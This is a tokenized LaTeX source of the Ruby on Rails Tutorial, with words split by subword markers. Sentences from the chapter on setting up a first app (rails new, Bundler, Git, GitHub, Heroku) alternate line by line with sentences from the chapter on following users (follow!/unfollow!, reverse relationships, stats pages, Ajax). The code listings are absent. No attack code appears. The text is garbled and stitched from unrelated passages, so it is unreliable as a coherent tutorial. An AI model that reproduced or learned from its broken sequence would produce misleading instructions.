▁Vi r t u ally ▁all ▁Rails ▁applications ▁start ▁the ▁same ▁way , ▁by ▁running ▁\ k ode { rails ▁new } ▁command .
▁ Adding ▁the ▁User ▁model ▁\ k ode { followed \_ users } ▁association .
▁Running ▁\ k ode { rails ▁new } ▁to ▁generate ▁a ▁new ▁application .
▁( This ▁\ k ode { follow ! } \ ▁method ▁should ▁always ▁work , ▁so , ▁as ▁with ▁\ k ode { create ! } \ ▁and ▁\ k ode { save ! }, ▁we ▁indicate ▁with ▁an ▁excl am ation ▁point ▁that ▁an ▁exception ▁will ▁be ▁raised ▁on ▁failure .)
▁In ▁the ▁application ▁code , ▁the ▁\ k ode { following ?}\ ▁method ▁take s ▁in ▁a ▁user , ▁called ▁\ k ode { other \_ user }, ▁and ▁check s ▁to ▁see ▁if ▁a ▁followed ▁user ▁with ▁that ▁id ▁exists ▁in ▁the ▁database ; ▁the ▁\ k ode { follow ! } \ ▁method ▁calls ▁\ k ode { create ! } \ ▁through ▁the ▁\ k ode { relationships } ▁association ▁to ▁create ▁the ▁following ▁relationship .
▁The ▁results ▁appear ▁in ▁Listing ~\ ref { code : following _ p _ follow _ bang }.
▁instead ▁of ▁the ▁equivalent ▁code
▁W hether ▁to ▁include ▁the ▁explicit ▁\ k ode { self } ▁is ▁large ly ▁a ▁matter ▁of ▁taste .
▁Of ▁course , ▁users ▁should ▁be ▁able ▁to ▁unfollow ▁other ▁users ▁as ▁well ▁as ▁follow ▁them , ▁which ▁lead s ▁to ▁the ▁some what ▁pre d ic table ▁\ k ode { unfollow ! }
▁Use ▁` bundle ▁show ▁[ gem name ]` ▁to ▁see ▁where ▁a ▁bundle d < n > gem ▁is ▁installed .
▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ unfollow _ test }.
▁A ▁test ▁for ▁unfollow ing ▁a ▁user .
▁Un following ▁a ▁user ▁by ▁destroying ▁a ▁user ▁relationship .
▁The ▁final ▁piece ▁of ▁the ▁relationships ▁p u z z le ▁is ▁to ▁add ▁a ▁\ k ode { user . followers } ▁method ▁to ▁go ▁with ▁\ k ode { user . followed \_ users }.
▁Inde ed , ▁the ▁technique ▁is ▁exactly ▁the ▁same ▁as ▁for ▁user ▁following , ▁with ▁the ▁role s ▁of ▁\ k ode { follower \_ id } ▁and ▁\ k ode { followed \_ id } ▁reverse d .
▁A ▁model ▁for ▁user ▁followers ▁using ▁a ▁reverse ▁Relationship ▁model .
▁Testing ▁for ▁reverse ▁relationships .
▁As ▁noted ▁brief ly ▁in ▁Section ~\ ref { sec : the _ first _ application }, ▁Bundler ▁is ▁run ▁automatically ▁( via ▁\ k ode { bundle ▁install }) ▁by ▁the ▁\ k ode { rails } ▁command , ▁but ▁in ▁this ▁section ▁we ' ll ▁make ▁some ▁changes ▁to ▁the ▁default ▁application ▁gems ▁and ▁run ▁Bundler ▁again .
▁Noti ce ▁how ▁we ▁switch ▁subject s ▁using ▁the ▁\ k ode { subject } ▁method , ▁replacing ▁\ k ode {@ user } ▁with ▁\ k ode { other \_ user }, ▁allow ing ▁us ▁to ▁test ▁the ▁follower ▁relationship ▁in ▁a ▁natural ▁way :
▁This ▁involve s ▁open ing ▁the ▁\ k ode { Gemfile } ▁with ▁your ▁favor ite ▁text ▁editor :
▁As ▁you ▁ probably ▁suspect , ▁we ▁will ▁not ▁be ▁making ▁a ▁whole ▁database ▁table ▁just ▁to ▁hold ▁reverse ▁relationships .
▁Instead , ▁we ▁will ▁ exploit ▁the ▁under ly ing ▁ s y m me try ▁between ▁followers ▁and ▁followed ▁users ▁to ▁simul ate ▁a ▁\ k ode { reverse \_ relationships } ▁table ▁by ▁passing ▁\ k ode { followed \_ id } ▁as ▁the ▁primary ▁key .
▁The ▁default ▁\ k ode { Gemfile } ▁in ▁the ▁\ k ode { first \_ app } ▁directory .
▁In ▁other ▁words , ▁where ▁the ▁\ k ode { relationships } ▁association ▁uses ▁the ▁\ k ode { follower \_ id } ▁foreign ▁key ,
▁the ▁\ k ode { reverse \_ relationships } ▁association ▁uses ▁\ k ode { followed \_ id } :
▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ reverse _ relationships }.
▁Implement ing ▁\ k ode { user . followers } ▁using ▁reverse ▁relationships .
▁Note ▁that ▁we ▁actually ▁have ▁to ▁include ▁the ▁\ emph { class } ▁name ▁for ▁this ▁association , ▁i . e . ,
▁because ▁otherwise ▁Rails ▁would ▁look ▁for ▁a ▁\ k ode { R ever se Relation s h ip } ▁class , ▁which ▁does n ' t ▁exist .
▁It ' s ▁also ▁worth ▁noting ▁that ▁we ▁could ▁actually ▁omit ▁the ▁\ k ode { : source } ▁key ▁in ▁this ▁case , ▁using ▁simply
▁since , ▁in ▁the ▁case ▁of ▁a ▁\ k ode { : followers } ▁attribute , ▁Rails ▁will ▁ singularize ▁`` followers '' ▁and ▁automatically ▁look ▁for ▁the ▁foreign ▁key ▁\ k ode { follower \_ id } ▁in ▁this ▁case .
▁I ' ve ▁ k e p t ▁the ▁\ k ode { : source } ▁key ▁to ▁emphasize ▁the ▁parallel ▁structure ▁with ▁the ▁\ k ode { has \_ many ▁: followed \_ users } ▁association , ▁but ▁you ▁are ▁free ▁to ▁leave ▁it ▁off .
▁This ▁section ▁has ▁placed ▁rather ▁heav y ▁d em and s ▁on ▁your ▁data ▁model ing ▁ skills , ▁and ▁it ' s ▁fine ▁if ▁it ▁take s ▁a ▁while ▁to ▁so a k ▁in .
▁In ▁fact , ▁one ▁of ▁the ▁best ▁ways ▁to ▁understand ▁the ▁associations ▁is ▁to ▁use ▁them ▁in ▁the ▁web ▁interface , ▁as ▁seen ▁in ▁the ▁next ▁section .
▁# ▁gem ▁' c api str an o ' , ▁group : ▁: development
▁Un less ▁you ▁specify ▁a ▁version ▁number ▁to ▁the ▁\ k ode { gem } ▁command , ▁Bundler ▁will ▁automatically ▁install ▁the ▁latest ▁version ▁of ▁the ▁gem .
▁As ▁in ▁previous ▁chapter s , ▁we ▁will ▁find ▁it ▁convenient ▁to ▁use ▁the ▁sample ▁data ▁Rake ▁task ▁to ▁fill ▁the ▁database ▁with ▁sample ▁relationships .
▁( If ▁you ▁are ▁using ▁a ▁version ▁of ▁Ruby ▁other ▁than ▁2 . 0 . 0, ▁you ▁should ▁change ▁the ▁Ruby ▁version ▁line ▁according ly .)
▁The ▁updated ▁\ k ode { Gemfile } ▁also ▁changes ▁the ▁line ▁for ▁jQuery , ▁the ▁default ▁JavaScript ▁library ▁used ▁by ▁Rails , ▁from
▁We ' ve ▁also ▁changed
▁make _ users
▁make _ microposts
▁make _ relationships
▁This ▁step ▁is ▁necessary ▁only ▁if ▁you ' ve ▁changed ▁the ▁version ▁of ▁the ▁Rails ▁gem , ▁which ▁would ▁likely ▁happen ▁only ▁if ▁you ' re ▁using ▁Rails ▁Installer , ▁but ▁it ▁does ▁no ▁harm ▁to ▁run ▁it ▁in ▁other ▁cases ▁as ▁well .
▁Here ▁the ▁sample ▁relationships ▁are ▁created ▁using ▁the ▁code
▁We ▁some what ▁arbitrar ily ▁arrange ▁for ▁the ▁first ▁user ▁to ▁follow ▁users ~3 ▁through ▁5 1, ▁and ▁the n ▁have ▁users ▁4 ▁through ▁4 1 ▁follow ▁that ▁user ▁back .
▁T hanks ▁to ▁running ▁\ k ode { rails ▁new } ▁in ▁Section ~\ ref { sec : the _ first _ application } ▁and ▁\ k ode { bundle ▁install } ▁in ▁Section ~\ ref { sec : bundle r }, ▁we ▁already ▁have ▁an ▁application ▁we ▁can ▁run --- but ▁how ?
▁H appily , ▁Rails ▁comes ▁with ▁a ▁command - line ▁program , ▁or ▁\ emph { script }, ▁that ▁run s ▁a ▁\ emph { local } ▁web ▁server , ▁visible ▁only ▁from ▁your ▁development ▁machine
▁Now ▁that ▁our ▁sample ▁users ▁have ▁both ▁followed ▁user ▁and ▁followers ▁arrays , ▁we ▁need ▁to ▁update ▁the ▁profile ▁page ▁and ▁Home ▁page ▁to ▁reflect ▁this .
▁=> ▁Call ▁with ▁- d ▁to ▁d et a ch
▁We ' ll ▁next ▁add ▁a ▁follow / unfollow ▁form , ▁and ▁the n ▁make ▁d ed icated ▁pages ▁for ▁show ing ▁user ▁followed ▁users ▁and ▁followers .
▁( If ▁your ▁system ▁complain s ▁about ▁the ▁ la c k ▁of ▁a ▁JavaScript ▁runtime , ▁visit ▁the ▁\ href { https :// github . com / s st e phens on / execjs }{ execjs ▁page ▁at ▁GitHub } ▁for ▁a ▁list ▁of ▁possibilities .
▁I ▁particular ly ▁recommend ▁install ing ▁\ href { http :// n ode js . org /}{ N ode . js }. )
▁No rm ally , ▁website s ▁run ▁on ▁ port ▁80 , ▁but ▁this ▁usually ▁requires ▁special ▁privilege s , ▁so ▁Rails ▁ pick s ▁a ▁less ▁restrict ed ▁high er - number ed ▁ port ▁for ▁the ▁development ▁server .
▁This ▁address ▁tell s ▁the ▁computer ▁to ▁list en ▁on ▁every ▁available ▁ IP ▁address ▁configured ▁on ▁that ▁specific ▁machine ; ▁in ▁particular , ▁we ▁can ▁view ▁the ▁application ▁using ▁the ▁special ▁address ▁\ k ode { 1 27 . 0 . 0 . 1 }, ▁which ▁is ▁also ▁known ▁as ▁\ k ode { localhost }.
▁To ▁see ▁information ▁about ▁our ▁first ▁application , ▁click ▁on ▁the ▁link ▁`` About ▁your ▁application ' s ▁environment ''.
▁The ▁result ▁is ▁show n ▁in ▁F igure ~\ ref { fig : riding _ rails _ environment }.
▁S ince ▁both ▁pages ▁will ▁be ▁show ing ▁data , ▁we ▁use ▁\ k ode { get } ▁to ▁arrange ▁for ▁the ▁URLs ▁to ▁respond ▁to ▁\ text tt { GET } ▁requests ▁( as ▁required ▁by ▁the ▁REST ▁convention ▁for ▁such ▁pages ), ▁and ▁the ▁\ k ode { member } ▁method ▁means ▁that ▁the ▁routes ▁respond ▁to ▁URLs ▁containing ▁the ▁user ▁id .
▁We ' ll ▁remove ▁the ▁default ▁page ▁( and ▁replace ▁it ▁with ▁a ▁custom ▁home ▁page ) ▁in ▁Section ~\ ref { sec : rails _ routes }.
▁With ▁the ▁routes ▁defined , ▁we ▁are ▁now ▁in ▁a ▁position ▁to ▁make ▁tests ▁for ▁the ▁stats ▁partial .
▁Now ▁that ▁we ▁have ▁a ▁fresh ▁and ▁working ▁Rails ▁application , ▁we ' ll ▁take ▁a ▁moment ▁for ▁a ▁step ▁that , ▁while ▁technical ly ▁optional , ▁would ▁be ▁view ed ▁by ▁many ▁Rails ▁developers ▁as ▁practical ly ▁essential , ▁name ly , ▁ placing ▁our ▁application ▁source ▁code ▁under ▁\ emph { version ▁control }.
▁( We ▁could ▁have ▁written ▁the ▁tests ▁first , ▁but ▁the ▁named ▁routes ▁would ▁have ▁been ▁hard ▁to ▁motivate ▁without ▁the ▁updated ▁routes ▁file .)
▁Testing ▁the ▁following / follower ▁sta t ist ic s ▁on ▁the ▁Home ▁page .
▁ K now ing ▁how ▁to ▁use ▁a ▁version ▁control ▁system ▁is ▁a ▁required ▁ s k i ll ▁for ▁every ▁software ▁developer .
▁Git ▁is ▁a ▁large ▁subject , ▁and ▁we ' ll ▁only ▁be ▁scratch ing ▁the ▁ s ur fa ce ▁in ▁this ▁book , ▁but ▁there ▁are ▁many ▁good ▁free ▁resources ▁online ; ▁I ▁es pecially ▁recommend ▁\ href { http :// git - sc m . com / book }{\ emph { Pro ▁Git } } ▁by ▁S co tt ▁C ha co n ▁( A pre s s , ▁200 9 ).
▁< n > ▁end
▁( As ▁noted ▁in ▁that ▁section , ▁this ▁involve s ▁following ▁the ▁instructions ▁in ▁the ▁\ href { http :// git - sc m . com / book / en / getting - started - install ing - git }{ Installing ▁Git ▁section ▁of ▁\ emph { Pro ▁Git } }. )
▁After ▁install ing ▁Git , ▁you ▁should ▁perform ▁a ▁set ▁of ▁one - time ▁setup ▁steps .
▁The ▁core ▁of ▁this ▁test ▁is ▁the ▁expect ation ▁that ▁the ▁following ▁and ▁follower ▁count s ▁appear ▁on ▁the ▁page , ▁together ▁with ▁the ▁right ▁URLs :
▁I ▁also ▁like ▁to ▁use ▁\ k ode { co } ▁in ▁place ▁of ▁the ▁more ▁verb o se ▁\ k ode { checkout } ▁command , ▁which ▁we ▁can ▁arrange ▁as ▁follows :
▁This ▁tutorial ▁will ▁usually ▁use ▁the ▁full ▁\ k ode { checkout } ▁command , ▁which ▁works ▁for ▁systems ▁that ▁don ' t ▁have ▁\ k ode { co } ▁configured , ▁but ▁in ▁real ▁life ▁I ▁ nearly ▁always ▁use ▁\ k ode { git ▁co }.
▁Also ▁note ▁that ▁in ▁this ▁case ▁the ▁word ▁`` followers '' ▁is ▁act ing ▁as ▁a ▁\ emph { label }, ▁so ▁we ▁keep ▁it ▁plural ▁even ▁when ▁there ▁is ▁only ▁one ▁follower .
▁as ▁show n ▁in ▁Listing ~\ ref { code : stats _ partial }.
▁Now ▁we ▁come ▁to ▁some ▁steps ▁that ▁are ▁necessary ▁each ▁time ▁you ▁create ▁a ▁new ▁\ emph { repository }.
▁Initialize d ▁empty ▁Git ▁repository ▁in ▁/ Users / mhartl / rails _ projects / first _ app / . git /
▁The ▁next ▁step ▁is ▁to ▁add ▁the ▁project ▁files ▁to ▁the ▁repository .
▁The ▁result ▁appears ▁in ▁F igure ~\ ref { fig : home _ page _ follow _ stats }.
▁This ▁command ▁add s ▁the ▁project ▁files ▁to ▁a ▁\ emph { staging ▁are a }, ▁which ▁contains ▁ pending ▁changes ▁to ▁your ▁project ; ▁you ▁can ▁see ▁which ▁files ▁are ▁in ▁the ▁ staging ▁are a ▁using ▁the ▁\ k ode { status } ▁command
▁The ▁Home ▁page ▁(\ href { http :// localhost :3000/ }{/ }) ▁with ▁follow ▁stats . ~\ href { http :// railstutorial . org / images / figures / home _ page _ follow _ stats _ bootstrap - full . png }{ ( full ▁size )}
▁as ▁seen ▁in ▁Listing ~\ ref { code : relationships _ resource }.
▁This ▁is ▁in ▁contrast ▁to ▁the ▁popular ▁open - source ▁version ▁control ▁system ▁called ▁S u b version , ▁in ▁which ▁a ▁commit ▁necessar ily ▁make s ▁changes ▁on ▁a ▁remote ▁repository .
▁Git ▁ div id es ▁a ▁S u b version - style ▁commit ▁into ▁its ▁two ▁logic al ▁pieces : ▁a ▁local ▁record ing ▁of ▁the ▁changes ▁(\ k ode { git ▁commit }) ▁and ▁a ▁push ▁of ▁the ▁changes ▁up ▁to ▁a ▁remote ▁repository ▁(\ k ode { git ▁push }).
▁Date : ▁Thu ▁Oct ▁ 15 ▁ 11 : 36 : 2 1 ▁200 9 ▁- 07 00
▁To ▁exit ▁\ k ode { git ▁log }, ▁you ▁may ▁have ▁to ▁type ▁\ k ode { q } ▁to ▁ quit .
▁It ' s ▁ probably ▁not ▁entire ly ▁clear ▁at ▁this ▁point ▁why ▁ putting ▁your ▁source ▁under ▁version ▁control ▁does ▁you ▁any ▁good , ▁so ▁let ▁me ▁give ▁just ▁one ▁example .
▁( We ' ll ▁see ▁many ▁other s ▁in ▁the ▁chapter s ▁a head .)
▁The ▁`` hidden '' ▁\ k ode { input } ▁tag ▁put s ▁the ▁relevant ▁information ▁on ▁the ▁page ▁without ▁display ing ▁it ▁in ▁the ▁browser .
▁Suppose ▁you ' ve ▁made ▁some ▁accidental ▁changes , ▁such ▁as ▁( D ' o h ! ) ▁deleting ▁the ▁ critical ▁\ k ode { app / controllers / } ▁directory :
▁Here ▁we ' re ▁using ▁the ▁Unix ▁\ k ode { l s } ▁command ▁to ▁list ▁the ▁contents ▁of ▁the ▁\ k ode { app / controllers / } ▁directory ▁and ▁the ▁\ k ode { rm } ▁command ▁to ▁remove ▁it .
▁Let ' s ▁check ▁the ▁status ▁to ▁see ▁what ' s ▁up :
▁This ▁means ▁we ▁can ▁ still ▁undo ▁the ▁changes ▁easily ▁by ▁ having ▁Git ▁check ▁out ▁the ▁previous ▁commit ▁with ▁the ▁\ k ode { checkout } ▁command ▁( and ▁a ▁\ k ode { - f } ▁flag ▁to ▁force ▁overwrit ing ▁the ▁current ▁changes ) :
▁A ▁user ▁profile ▁with ▁a ▁follow ▁button ▁(\ href { http :// localhost :3000/ users / 2 }{/ users / 2 }). ~\ href { http :// railstutorial . org / images / figures / profile _ follow _ button _ bootstrap - full . png }{ ( full ▁size )}
▁The ▁missing ▁directory ▁and ▁file ▁are ▁back .
▁A ▁user ▁profile ▁with ▁an ▁unfollow ▁button ▁(\ href { http :// localhost :3000/ users / 8 }{/ users / 6 }). ~\ href { http :// railstutorial . org / images / figures / profile _ unfollow _ button _ bootstrap - full . png }{ ( full ▁size )}
▁Now ▁that ▁you ' ve ▁put ▁your ▁project ▁under ▁version ▁control ▁with ▁Git , ▁it ' s ▁time ▁to ▁push ▁your ▁code ▁up ▁to ▁\ href { http :// github . com }{ GitHub }, ▁a ▁so cial ▁ coding ▁site ▁optimized ▁for ▁host ing ▁and ▁ s h ar ing ▁Git ▁repositories .
▁Pages ▁to ▁display ▁followed ▁users ▁and ▁followers ▁will ▁re s em b le ▁a ▁ hybrid ▁of ▁the ▁user ▁profile ▁page ▁and ▁the ▁user ▁index ▁page ▁( Section ~\ ref { sec : user _ index }), ▁with ▁a ▁sidebar ▁of ▁user ▁information ▁( including ▁the ▁following ▁stats ) ▁and ▁a ▁list ▁of ▁users .
▁P utting ▁a ▁copy ▁of ▁your ▁Git ▁repository ▁at ▁GitHub ▁serve s ▁two ▁purposes : ▁it ' s ▁a ▁full ▁back up ▁of ▁your ▁code ▁( including ▁the ▁full ▁ history ▁of ▁commit s ), ▁and ▁it ▁make s ▁any ▁future ▁collaborat ion ▁much ▁easier .
▁In ▁addition , ▁we ' ll ▁include ▁a ▁ ra s ter ▁of ▁user ▁profile ▁image ▁links ▁in ▁the ▁sidebar .
▁This ▁step ▁is ▁optional , ▁but ▁being ▁a ▁GitHub ▁member ▁will ▁open ▁the ▁do or ▁to ▁part ic ip at ing ▁in ▁a ▁ wide ▁variety ▁of ▁open - source ▁project s .
▁GitHub ▁has ▁a ▁variety ▁of ▁p a id ▁plan s , ▁but ▁for ▁open - source ▁code ▁their ▁ service s ▁are ▁free , ▁so ▁sign ▁up ▁for ▁a ▁\ href { https :// github . com / signup / free }{ free ▁GitHub ▁account } ▁if ▁you ▁don ' t ▁have ▁one ▁already .
▁A ▁mockup ▁of ▁the ▁user ▁following ▁page . ~\ href { http :// railstutorial . org / images / figures / following _ mockup _ bootstrap - full . png }{ ( full ▁size )}
▁( You ▁m ight ▁have ▁to ▁follow ▁the ▁\ href { http :// help . github . com / key - setup - redirect }{ GitHub ▁tutorial ▁on ▁creating ▁ SS H ▁keys } ▁first .)
▁A ▁mockup ▁of ▁the ▁user ▁followers ▁page . ~\ href { http :// railstutorial . org / images / figures / followers _ mockup _ bootstrap - full . png }{ ( full ▁size )}
▁( T a k e ▁care ▁\ emph { not } ▁to ▁initialize ▁the ▁repository ▁with ▁a ▁\ k ode { README } ▁file , ▁as ▁\ k ode { rails ▁new } ▁creates ▁one ▁of ▁those ▁automatically .)
▁After ▁ submitting ▁the ▁form , ▁push ▁up ▁your ▁first ▁application ▁as ▁follows :
▁in ▁Listing ~\ ref { code : following _ followers _ authorization _ test }.
▁These ▁commands ▁tell ▁Git ▁that ▁you ▁want ▁to ▁add ▁GitHub ▁as ▁the ▁ origin ▁for ▁your ▁main ▁(\ emph { master }) ▁branch ▁and ▁the n ▁push ▁your ▁repository ▁up ▁to ▁GitHub .
▁( Do n ' t ▁worry ▁about ▁what ▁the ▁\ text tt { - u } ▁flag ▁does ; ▁if ▁you ' re ▁curious , ▁do ▁a ▁web ▁search ▁for ▁`` git ▁set ▁up st re am '' .)
▁ .
▁GitHub ▁also ▁has ▁native ▁applications ▁to ▁a ug ment ▁the ▁command - line ▁interface , ▁so ▁if ▁you ' re ▁more ▁com for table ▁with ▁G U I ▁app s ▁you ▁m ight ▁want ▁to ▁check ▁out ▁\ href { http :// w in do w s . github . com /}{ GitHub ▁for ▁Windows } ▁or ▁\ href { http :// m ac . github . com /}{ GitHub ▁for ▁Mac }.
▁( GitHub ▁for ▁L in u x ▁is ▁ still ▁just ▁Git , ▁it ▁seem s .)
▁ Sign ▁in
▁Because ▁of ▁the ▁\ k ode { . rdoc } ▁extension ▁on ▁the ▁file , ▁GitHub ▁ensure s ▁that ▁it ▁is ▁ formatted ▁nicely , ▁but ▁the ▁contents ▁are n ' t ▁helpful ▁at ▁all , ▁so ▁in ▁this ▁section ▁we ' ll ▁make ▁our ▁first ▁edit ▁by ▁changing ▁the ▁\ k ode { README } ▁to ▁describe ▁our ▁project ▁rather ▁than ▁the ▁Rails ▁framework ▁itself .
▁ Test ▁for ▁the ▁\ k ode { followed \_ users } ▁and ▁\ k ode { followers } ▁pages .
▁ Each ▁action ▁needs ▁to ▁set ▁a ▁title , ▁find ▁the ▁user , ▁retrieve ▁either ▁\ k ode {@ user . followed \_ users } ▁or ▁\ k ode {@ user . followers } ▁( in ▁ paginate d ▁form ), ▁and ▁the n ▁render ▁the ▁page .
▁By ▁the ▁way , ▁for ▁a ▁change ▁as ▁small ▁as ▁this ▁one ▁I ▁would n ' t ▁normally ▁both er ▁with ▁a ▁new ▁branch , ▁but ▁it ' s ▁ never ▁too ▁ early ▁to ▁start ▁p r ac tic ing ▁good ▁habit s .
▁I ▁prefer ▁the ▁\ href { http :// d ar ing fi re b all . net / projects / m ar k d own /}{ Markdown ▁markup ▁language } ▁to ▁the ▁default ▁ RDoc ▁for ▁this ▁purpose , ▁and ▁if ▁you ▁use ▁the ▁file ▁extension ▁\ k ode { . m d } ▁the n ▁GitHub ▁will ▁automatically ▁format ▁it ▁nicely ▁for ▁you .
▁# ▁Ruby ▁on ▁Rails ▁Tutorial : ▁first ▁application
▁This ▁is ▁the ▁first ▁application ▁for ▁the
▁by ▁[ Michael ▁Hartl ]( http :// michael hartl . com / ).
▁Note ▁here ▁that ▁both ▁actions ▁make ▁an ▁\ emph { e xplicit } ▁call ▁to ▁\ k ode { render }, ▁in ▁this ▁case ▁rendering ▁a ▁view ▁called ▁\ k ode { show \_ follow }, ▁which ▁we ▁must ▁create .
▁Be ▁careful ▁about ▁using ▁the ▁\ k ode { - a } ▁flag ▁i mp r o p er ly ; ▁if ▁you ▁have ▁added ▁any ▁new ▁files ▁to ▁the ▁project ▁since ▁the ▁last ▁commit , ▁you ▁ still ▁have ▁to ▁tell ▁Git ▁about ▁them ▁using ▁\ k ode { git ▁add } ▁first .
▁Note ▁that ▁we ▁write ▁the ▁commit ▁message ▁in ▁the ▁\ emph { present } ▁te n se .
▁See ▁the ▁GitHub ▁post ▁\ href { https :// github . com / blog / 9 2 6 - s h in y - new - commit - style s }{ S h in y ▁new ▁commit ▁style s } ▁for ▁more ▁information .
▁Show ing ▁the ▁users ▁being ▁followed ▁by ▁the ▁current ▁user . ~\ href { http :// railstutorial . org / images / figures / user _ following _ bootstrap - full . png }{ ( full ▁size )}
▁Show ing ▁the ▁current ▁user ' s ▁followers . ~\ href { http :// railstutorial . org / images / figures / user _ followers _ bootstrap - full . png }{ ( full ▁size )}
▁The ▁tests ▁for ▁these ▁button s ▁combine ▁many ▁of ▁the ▁testing ▁technique s ▁covered ▁throughout ▁this ▁tutorial ▁and ▁make ▁for ▁a ▁good ▁exercise ▁in ▁reading ▁code .
▁We ' ll ▁cover ▁it ▁moment ar ily .)
▁Note ▁in ▁particular ▁the ▁use ▁of ▁the ▁\ k ode { ha ve \_ x path } ▁method , ▁which ▁is ▁an ▁advanced ▁and ▁powerful ▁technique ▁that ▁uses ▁\ href { http :// en . wiki p edia . org / wiki / X P at h }{ X P at h } ▁to ▁navigate ▁ X ML ▁document s ▁( including ▁HTML 5 ).
▁You ▁can ▁read ▁more ▁about ▁ X P at h ▁by ▁doing ▁a ▁web ▁search ▁for ▁\ href { http :// www . w 3 school s . com / x path / x path _ s y n t a x . as p }{ X P at h ▁syntax }.
▁Tests ▁for ▁the ▁Follow / U n follow ▁button .
▁< n > ▁end
▁Now ▁that ▁we ' ve ▁updated ▁the ▁\ k ode { README }, ▁we ▁can ▁push ▁the ▁changes ▁up ▁to ▁GitHub ▁to ▁see ▁the ▁result .
▁S ince ▁we ▁have ▁already ▁done ▁one ▁push ▁( Section ~\ ref { sec : github }), ▁on ▁most ▁systems ▁we ▁can ▁omit ▁\ k ode { origin ▁master }, ▁and ▁simply ▁run ▁\ k ode { git ▁push } :
▁Even ▁at ▁this ▁ early ▁stage , ▁we ' re ▁already ▁going ▁to ▁deploy ▁our ▁( still - empty ) ▁Rails ▁application ▁to ▁production .
▁Writ ing ▁the ▁implementation ▁involve s ▁d ig g ing ▁a ▁little ▁ deep er : ▁following ▁and ▁unfollow ing ▁involve ▁\ emph { creating } ▁and ▁\ emph { destroy ing } ▁relationships , ▁which ▁means ▁defin ing ▁\ k ode { create } ▁and ▁\ k ode { destroy } ▁actions ▁in ▁a ▁Relationship s ▁controller ▁( which ▁we ▁must ▁create ).
▁( This ▁is ▁the ▁security ▁hole ▁all u d ed ▁to ▁above .)
▁Tests ▁for ▁the ▁Relationship s ▁controller ▁authorization .
▁A ▁\ k ode { Gemfile } ▁with ▁added ▁gems ▁and ▁explicit ▁Ruby ▁version .
▁Note ▁that , ▁in ▁order ▁to ▁avoid ▁the ▁overhead ▁of ▁creating ▁a ▁virtual ly ▁use less ▁Relationship ▁object , ▁the ▁\ k ode { delete } ▁test ▁hard - code s ▁the ▁id ~\ k ode {1} ▁in ▁the ▁named ▁route :
▁To ▁install ▁it , ▁we ▁run ▁\ k ode { bundle ▁install } ▁with ▁a ▁special ▁flag :
▁This ▁works ▁because ▁the ▁user ▁should ▁be ▁redirect ed ▁before ▁the ▁application ▁ever ▁ tries ▁to ▁retrieve ▁the ▁relationship ▁with ▁this ~ id .
▁The ▁controller ▁code ▁needed ▁to ▁get ▁these ▁tests ▁to ▁pass ▁is ▁re m ar k ably ▁con ci se : ▁we ▁just ▁retrieve ▁the ▁user ▁followed ▁or ▁to ▁be ▁followed , ▁and ▁the n ▁follow ▁or ▁unfollow ▁the ▁user ▁using ▁the ▁relevant ▁utility ▁method .
▁Because ▁the ▁only ▁gems ▁we ' ve ▁added ▁are ▁restrict ed ▁to ▁a ▁production ▁environment , ▁right ▁now ▁this ▁command ▁does n ' t ▁actually ▁install ▁any ▁ additional ▁local ▁gems , ▁but ▁it ' s ▁needed ▁to ▁update ▁\ k ode { Gemfile . lock } ▁with ▁the ▁\ text tt { p g } ▁and ▁\ text tt { rails \_ 12 factor } ▁gems ▁and ▁the ▁specific ▁Ruby ▁version .
▁The ▁full ▁implementation ▁appears ▁in ▁Listing ~\ ref { code : relationships _ controller }.
▁The ▁first ▁step ▁is ▁to ▁\ href { http :// api . heroku . com / signup }{ sign ▁up ▁for ▁Heroku } ; ▁after ▁check ing ▁your ▁email ▁to ▁complete ▁the ▁creation ▁of ▁your ▁account , ▁install ▁the ▁necessary ▁Heroku ▁software ▁using ▁the ▁\ href { https :// to ol be lt . heroku . com /}{ Heroku ▁To ol be lt }
▁Then ▁use ▁the ▁\ k ode { heroku } ▁command ▁to ▁log ▁in ▁at ▁the ▁command ▁line ▁( you ▁may ▁have ▁to ▁exit ▁and ▁restart ▁your ▁terminal ▁program ▁first ) :
▁With ▁that , ▁the ▁core ▁follow / unfollow ▁functionality ▁is ▁complete , ▁and ▁any ▁user ▁can ▁follow ▁( or ▁unfollow ) ▁any ▁other ▁user , ▁which ▁you ▁should ▁verify ▁both ▁by ▁click ing ▁around ▁in ▁the ▁sample ▁application ▁and ▁by ▁running ▁the ▁test ▁suite :
▁In ▁other ▁words , ▁a ▁user ▁start s ▁on ▁a ▁profile ▁page , ▁follows ▁the ▁user , ▁and ▁is ▁immediately ▁redirect ed ▁back ▁to ▁the ▁original ▁page .
▁Create d ▁ http :// st or my - cloud - 5 88 1 . heroku app . com / ▁|
▁git @ heroku . com : st or my - cloud - 5 88 1 . heroku app . com
▁Because ▁it ▁is ▁no m inally ▁an ▁ acronym ▁for ▁\ emph { as y n ch r on ous ▁JavaScript ▁and ▁ X ML }, ▁Ajax ▁is ▁some times ▁m is s p e ll ed ▁`` A J A X '' , ▁even ▁though ▁the ▁\ href { http :// www . adapt ive path . com / id e as / es s a y s / archive s / 000 38 5 . ph p }{ origin al ▁Ajax ▁article } ▁sp e ll s ▁it ▁as ▁`` A j a x '' ▁throughout .
▁Because ▁the ▁practice ▁of ▁adding ▁Ajax ▁to ▁web ▁forms ▁is ▁quite ▁common , ▁Rails ▁make s ▁Ajax ▁easy ▁to ▁implement .
▁To ▁deploy ▁the ▁application , ▁the ▁first ▁step ▁is ▁to ▁use ▁Git ▁to ▁push ▁it ▁up ▁to ▁Heroku :
▁You ▁can ▁also ▁use ▁an ▁argument ▁to ▁the ▁\ k ode { heroku } ▁command ▁that ▁automatically ▁open s ▁your ▁browser ▁with ▁the ▁right ▁address :
▁U nfortunately , ▁the ▁result ing ▁page ▁is ▁an ▁error ; ▁as ▁of ▁Rails ~4.0 , ▁for ▁technical ▁reason s ▁the ▁default ▁Rails ▁page ▁does n ' t ▁work ▁on ▁Heroku .
▁The ▁actual ▁HTML ▁generated ▁by ▁this ▁ERb ▁is n ' t ▁particular ly ▁relevant , ▁but ▁you ▁m ight ▁be ▁curious , ▁so ▁here ' s ▁a ▁p e e k :
▁By ▁using ▁a ▁simple ▁HTML ▁property ▁instead ▁of ▁insert ing ▁the ▁full ▁JavaScript ▁code ▁( as ▁in ▁previous ▁versions ▁of ▁Rails ), ▁Rails ~3 ▁follows ▁the ▁ ph i lo so ph y ▁of ▁\ href { http :// r ailscasts . com / episodes / 20 5 - u nobtrusive - javascript }{\ emph { u nobtrusive ▁JavaScript } }.
▁in ▁Listing ~\ ref { code : relationships _ controller _ spec _ ajax }.
